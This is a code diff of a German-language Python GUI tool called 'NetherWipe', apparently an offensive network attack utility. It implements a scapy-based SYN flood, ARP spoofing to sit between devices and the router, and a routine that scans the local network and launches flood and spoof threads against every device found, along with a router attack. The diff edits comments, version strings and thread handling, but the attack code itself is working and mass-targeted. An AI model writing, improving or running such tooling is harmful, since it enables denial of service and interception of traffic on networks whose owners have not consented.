@@ -3,19 +3,17 @@ import subprocess
 import sys
 import threading
 import time
-import socket
-import os
+import random
 from tkinter import *
 from tkinter import scrolledtext, messagebox
 from scapy.all import IP, TCP, send, srp, ARP, Ether, conf
-import random
 
 conf.verb = 0
 
 class NetherWipe:
     def __init__(self, root):
         self.root = root
-        self.root.title("NetherWipe v1.1")
+        self.root.title("NetherWipe v1.0")
         self.root.geometry("600x500")
         self.root.configure(bg="#1e1e2e")
         self.running = True
@@ -36,7 +34,7 @@ class NetherWipe:
         self.log_area = scrolledtext.ScrolledText(root, width=70, height=20, bg="#2d2d3a", fg="#00ff99", font=("Courier", 10))
         self.log_area.pack(pady=10)
 
-        self.log("NetherWipe gestartet (kein hping3 – reine scapy DoS)")
+        self.log("NetherWipe gestartet")
 
     def log(self, msg):
         self.log_area.insert(END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
@@ -55,26 +53,20 @@ class NetherWipe:
         return [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
 
     def syn_flood(self, target_ip, duration=30):
-        """ SYN Flood mit scapy – keine externen Tools """
         self.log(f"SYN Flood auf {target_ip} für {duration}s")
         end_time = time.time() + duration
-        sport = random.randint(1024, 65535)
         while time.time() < end_time and self.running:
+            sport = random.randint(1024, 65535)
             ip = IP(dst=target_ip)
             tcp = TCP(sport=sport, dport=80, flags="S", seq=random.randint(1000, 5000))
             send(ip/tcp, verbose=0, count=1)
-            sport = random.randint(1024, 65535)
 
     def arp_spoof(self, target_ip, router_ip):
-        """ ARP-Spoofing mit scapy (kein arpspoof Befehl) """
-        self.log(f"ARP-Spoofing gestartet: {target_ip} <-> {router_ip}")
-        # Target MAC finden
         target_mac = self.get_mac(target_ip)
         router_mac = self.get_mac(router_ip)
         if not target_mac or not router_mac:
             self.log(f"MAC nicht gefunden für {target_ip} oder {router_ip}")
             return
-        # ARP Antworten senden
         while self.running:
             send(ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac), verbose=0)
             send(ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac), verbose=0)
@@ -113,13 +105,12 @@ class NetherWipe:
         self.log(f"Scanne {network}")
         devices = self.arp_scan(network)
         self.log(f"Gefunden: {len(devices)} Geräte")
-        # Starte Flood auf jedes Gerät
         for dev in devices:
-            threading.Thread(target=self.syn_flood, args=(dev['ip'], 60)).start()
-            threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip)).start()
+            threading.Thread(target=self.syn_flood, args=(dev['ip'], 60), daemon=True).start()
+            threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip), daemon=True).start()
             time.sleep(0.5)
-        threading.Thread(target=self.router_reset, args=(router_ip,)).start()
-        self.log("Alle Angriffe gestartet. Systeme werden zerstört.")
+        threading.Thread(target=self.router_reset, args=(router_ip,), daemon=True).start()
+        self.log("Alle Angriffe gestartet")
 
     def stop(self):
         self.running = False
